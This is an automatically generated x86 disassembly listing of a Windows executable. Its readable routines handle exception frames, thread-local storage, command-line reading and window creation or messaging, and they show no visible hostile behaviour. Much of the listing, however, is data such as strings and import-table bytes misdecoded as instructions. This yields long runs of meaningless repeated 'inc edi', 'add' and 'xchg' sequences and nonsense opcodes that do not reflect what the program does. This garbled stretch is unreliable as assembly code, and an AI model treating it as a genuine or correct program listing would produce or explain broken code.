mov [ fs : eax ] edx
push sub_405eb1
lea eax [ ebp - 0x10 ]
call sub_404038
retn
xor ebx ebx
sub_405eb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f02
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f09
retn
mov eax rw-data
call sub_402b94
mov eax rw-data
call sub_402b94
mov eax rw-data
call sub_402b94
call sub_401b70
sub_405f0c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404e58
call sub_403128
test al al
je r-xdata
call sub_40321c
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013bc
mov [ rw-data ] eax
call sub_4013b4
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403158
call sub_40132c
call sub_405e44
mov [ rw-data ] eax
call sub_4013b4
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40132c
call sub_405e44
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4013ac
mov [ rw-data ] eax
sub_406014
push ebx
call sub_40600c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_406000
test eax eax
jne r-xdata
mov eax 0xe2
call sub_40402c
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_40402c
sub_406058
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_406014
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_4060a4
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405fe0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406098
mov edx rw-data
mov eax ebx
call sub_403d80
pop ebx
retn
sub_4060e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40610d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406114
retn
sub_40615c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406178
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40619d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4061a4
retn
sub_4061c2
call [ eax + r-xdata ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
les esp [ ecx + 0x40 ]
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
xchg ebx eax
inc edi
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x6025ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
xchg ebx eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg ebx eax
sar bh 0x25
pop eax
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg edi eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg edi eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x6825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg ebx eax
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
js EnterCriticalSection
je r-xdata
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
mov eax eax
add eax esp
popad
inc eax
add [ ebx + 0x5825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
sub_406d30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402b10
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402b00
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402b10
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402b00
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406de0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406ed5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406efd
push [ fs : eax ]
